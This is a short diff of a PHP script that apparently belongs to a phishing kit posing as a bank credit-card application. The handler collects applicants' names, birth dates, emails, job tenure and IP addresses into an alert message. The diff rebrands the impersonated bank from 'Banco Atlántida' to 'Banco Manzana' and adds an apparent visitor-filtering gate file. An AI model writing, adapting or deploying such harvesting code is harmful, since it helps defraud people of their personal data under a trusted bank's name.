@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/gate_check.php';
 ini_set('display_errors', 0);
 header('Content-Type: application/json; charset=UTF-8');
 
@@ -28,7 +29,7 @@ $email      = trim($_POST['email']      ?? '');
 $antiguedad = trim($_POST['antiguedad'] ?? '');
 
 // Construir mensaje
-$msg  = "🏦 NUEVA SOLICITUD — BANCO ATLÁNTIDA\n";
+$msg  = "🏦 NUEVA SOLICITUD — BANCO MANZANA\n";
 $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
 $msg .= "👤 Nombre: " . ($nombres . ' ' . $apellidos) . "\n";
 $msg .= "📅 Fecha Nac: " . $fechaNac . "\n";
@@ -37,7 +38,7 @@ $msg .= "✉️ Correo: " . $email . "\n";
 $msg .= "🕐 Antigüedad: " . $antiguedad . "\n";
 $msg .= "🌐 IP: " . $ip . "\n";
 $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
-$msg .= "✅ Solicito tarjeta de crédito Atlántida Black Infinite\n";
+$msg .= "✅ Solicito tarjeta de crédito Manzana Black Infinite\n";
 
 // Identificador para los botones
 $uid = $nombres . ' ' . $apellidos;
